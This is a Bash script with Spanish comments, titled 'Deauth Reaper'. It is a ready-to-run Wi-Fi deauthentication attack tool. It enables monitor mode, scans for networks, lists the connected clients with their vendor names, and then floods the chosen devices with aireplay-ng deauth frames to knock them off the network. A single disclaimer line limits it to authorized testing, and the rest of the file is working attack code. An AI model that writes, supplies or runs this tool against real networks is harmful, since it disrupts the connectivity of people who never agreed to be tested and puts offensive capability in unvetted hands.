#!/bin/bash

# "Deauth Reaper" - Desconecta dispositivos de la red Wi-Fi mostrando nombres de fabricantes
# ⚠ Solo para entornos de ciberseguridad y pruebas autorizadas ⚠

# Verifica si el script se ejecuta como root
if [ "$EUID" -ne 0 ]; then
    echo "⚠ ERROR: Debes ejecutar este script como root."
    exit 1
fi

# Nombre de la interfaz Wi-Fi en modo monitor
INTERFACE="wlan0mon"

# Iniciar la interfaz en modo monitor
echo "💀 [Deauth Reaper] Activando modo monitor en la interfaz..."
airmon-ng start wlan0 > /dev/null 2>&1

# Escanear redes Wi-Fi
echo "📡 Escaneando redes Wi-Fi disponibles..."
airodump-ng "$INTERFACE"

# Solicitar el BSSID del router objetivo
read -p "🎯 Introduce el BSSID del router objetivo: " BSSID
read -p "📶 Introduce el canal de la red (CH): " CHANNEL

# Escanear los clientes conectados
echo "🔍 Escaneando dispositivos conectados a la red $BSSID..."
gnome-terminal -- airodump-ng --bssid "$BSSID" -c "$CHANNEL" --write clientes "$INTERFACE"

# Esperar unos segundos para capturar los datos
sleep 10
pkill airodump-ng  # Detener airodump-ng después del escaneo

# Listar los clientes conectados con nombres de fabricante
echo "📋 Dispositivos conectados detectados:"
echo "--------------------------------------"
echo "N°  |  MAC Address       |  Fabricante"
echo "--------------------------------------"
COUNT=1
cat clientes-01.csv | grep -E "(([A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2})" | awk -F, '{print $1}' | while read -r MAC; do
    VENDOR=$(macchanger -l | grep -i "$(echo $MAC | cut -c 1-8)" | awk -F '  ' '{print $2}' | head -n 1)
    if [ -z "$VENDOR" ]; then
        VENDOR="Desconocido"
    fi
    echo "$COUNT) $MAC - $VENDOR"
    COUNT=$((COUNT+1))
done
echo "--------------------------------------"

# Solicitar las MACs de los clientes a desconectar
read -p "💀 Introduce las MACs de los dispositivos a desconectar (separadas por espacio): " CLIENTES

# Enviar paquetes de desautenticación a cada cliente seleccionado
for MAC in $CLIENTES; do
    echo "🔥 [Deauth Reaper] Eliminando conexión de $MAC ..."
    aireplay-ng --deauth 10 -a "$BSSID" -c "$MAC" "$INTERFACE"
done

# Detener la interfaz en modo monitor y restaurarla a modo normal
airmon-ng stop "$INTERFACE" > /dev/null 2>&1
echo "✅ Interfaz restaurada a modo normal."

echo "💀 [Deauth Reaper] Operación completada."
